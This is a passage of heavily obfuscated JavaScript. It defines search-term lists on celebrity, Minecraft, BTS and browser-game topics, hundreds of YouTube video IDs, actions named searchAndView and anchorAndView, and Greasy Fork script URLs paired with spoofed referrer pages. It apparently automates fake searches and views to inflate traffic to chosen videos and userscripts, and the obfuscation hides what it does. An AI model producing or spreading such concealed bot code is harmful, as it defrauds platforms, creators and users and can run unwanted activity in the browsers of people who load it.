'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0xb * -0x2a1 + -0x26be + 0x43b3)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0xa38 + 0x2025 + 0xc5 * -0x37)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + X(0x1) + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x1 * 0x130d + 0x1ee7 * 0x1 + -0x1 * 0xbd7);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    Z(0xd, 'U8P&') + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    Y(0x0) + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    X(0xc) + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + Y(0xf) + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x13) + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': X(0x12) + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + Y(0xa) + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
